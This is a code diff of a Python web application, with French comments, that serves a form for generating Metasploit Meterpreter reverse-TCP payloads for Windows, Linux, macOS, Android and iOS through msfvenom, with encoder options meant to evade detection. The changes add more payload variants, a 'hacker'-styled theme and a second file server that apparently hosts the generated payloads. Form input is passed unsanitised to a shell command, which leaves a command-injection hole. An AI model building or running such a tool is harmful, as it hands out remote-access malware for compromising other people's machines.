@@ -2,78 +2,86 @@ import http.server
 import socketserver
 import os
 import subprocess
-
+import threading
 # Définition du répertoire racine du site web
 ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
 
 # Définition du port et de l'hôte pour le serveur web
-HOST = '192.168.1.128'  # or HOST = '<your_public_ip_address>'
 PORT = 8000
-
-# ...
-
+HOST = '192.168.1.43'
 
 # Définition du template HTML pour le formulaire
-# ...
-
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>Meterpreter Reverse TCP Generator</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            background-color: #1a1a1a; /* dark background */
+            font-family: monospace; /* monospace font for a hacker feel */
+            color: #33cc33; /* green text */
         }
         form {
             width: 50%;
             margin: 40px auto;
             padding: 20px;
-            border: 1px solid #ccc;
+            border: 1px solid #333; /* dark border */
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* dark shadow */
         }
         label {
             display: block;
             margin-bottom: 10px;
         }
         input[type="text"] {
-            width: 100%;
+            width: 50%;
             height: 30px;
             margin-bottom: 20px;
             padding: 10px;
-            border: 1px solid #ccc;
+            border: 1px solid #333; /* dark border */
+            background-color: #222; /* dark background */
+            color: #33cc33; /* green text */
         }
         select {
             width: 100%;
             height: 200px; /* adjust the height to your liking */
             overflow-y: auto; /* add scrollbar */
             padding: 10px;
-            border: 1px solid #ccc;
+            border: 1px solid #333; /* dark border */
+            background-color: #222; /* dark background */
+            color: #33cc33; /* green text */
         }
         button[type="submit"] {
-            background-color: #4CAF50;
-            color: #fff;
+            background-color: #333; /* dark background */
+            color: #33cc33; /* green text */
             padding: 10px 20px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
         }
         button[type="submit"]:hover {
-            background-color: #3e8e41;
+            background-color: #444; /* darker background on hover */
         }
     </style>
 </head>
 <body>
+    <h1 style="text-align: center; margin-bottom: 20px;">Bienvenue sur le générateur de Meterpreter Reverse TCP</h1>
+    <p style="text-align: center; margin-bottom: 40px;">Ce site vous permet de générer des payloads Meterpreter Reverse TCP pour différents systèmes d'exploitation.</p>
     <form action="" method="post">
         <label for="lhost">LHOST:</label>
         <input type="text" id="lhost" name="lhost" required><br><br>
         <label for="lport">LPORT:</label>
         <input type="text" id="lport" name="lport" required><br><br>
         <label for="payload">Payload:</label>
-        <select id="payload" name="payload" required size="10"> <!-- adjust the size to your liking -->
+        <select id="payload" name="payload" required size="20"> <!-- adjust the size to your liking -->
             <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
+            <option value="windows/x86/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP (x86)</option>
+            <option value="windows/x64/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP (x64)</option>
             <option value="linux/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP</option>
+            <option value="linux/x86/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP (x86)</option>
+            <option value="linux/x64/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP (x64)</option>
             <option value="osx/meterpreter/reverse_tcp">macOS Meterpreter Reverse TCP</option>
             <option value="android/meterpreter/reverse_tcp">Android Meterpreter Reverse TCP</option>
             <option value="ios/meterpreter/reverse_tcp">iOS Meterpreter Reverse TCP</option>
@@ -110,7 +118,7 @@ HTML_TEMPLATE = '''
         document.addEventListener("DOMContentLoaded", function() {
             document.querySelector("form").addEventListener("submit", function(event) {
                 event.preventDefault();
-                                var lhost = document.querySelector("#lhost").value;
+                var lhost = document.querySelector("#lhost").value;
                 var lport = document.querySelector("#lport").value;
                 var payload = document.querySelector("#payload").value;
                 var output = document.querySelector("#output").value;
@@ -129,9 +137,10 @@ HTML_TEMPLATE = '''
             });
         });
     </script>
+    
 </body>
-</html>'''
-
+</html>
+'''
 
 class WebServer(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -150,16 +159,20 @@ class WebServer(http.server.SimpleHTTPRequestHandler):
         output = output.split("=")[1]
         obfuscation = obfuscation.split("=")[1]
 
+
         # Génération du Meterpreter Reverse TCP avec Metasploit
-        msfvenom_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {output} -O payload"
+        msfvenom_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {output} -o payload.{output}"
+
+        # Handle obfuscation options
         if obfuscation == "base64":
-            msfvenom_cmd += " -e x86/shikata_ga_nai"
+            msfvenom_cmd += " -e x86/base64"
         elif obfuscation == "xor":
             msfvenom_cmd += " -e x86/xor"
         elif obfuscation == "shikata_ga_nai":
             msfvenom_cmd += " -e x86/shikata_ga_nai"
         else:
-            msfvenom_cmd += " -e x86/none"
+            # No obfuscation
+            pass
 
         # Exécution de la commande msfvenom
         output = subprocess.check_output(msfvenom_cmd, shell=True)
@@ -171,9 +184,32 @@ class WebServer(http.server.SimpleHTTPRequestHandler):
         self.wfile.write(output)
 
 
-if __name__ == "__main__":
+
+class LocalFileServer(http.server.SimpleHTTPRequestHandler):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.directory = ROOT_DIR
+
+def run_web_server():
     server_address = (HOST, PORT)
     httpd = http.server.HTTPServer(server_address, WebServer)
-    print(f"Serveur web : http://{HOST}:{PORT}")
+    print(f"Web server: http://{HOST}:{PORT}")
     httpd.serve_forever()
+
+def run_local_file_server():
+    local_server_address = ('192.168.1.43', 8001)
+    httpd = http.server.HTTPServer(local_server_address, LocalFileServer)
+    print(f"Local file server: http://192.168.1.43:8001")
+    httpd.serve_forever()
+
+if __name__ == "__main__":
+    web_server_thread = threading.Thread(target=run_web_server)
+    local_file_server_thread = threading.Thread(target=run_local_file_server)
+
+    web_server_thread.start()
+    local_file_server_thread.start()
+
+    print("Both servers are running...")
+    while True:
+        pass
 
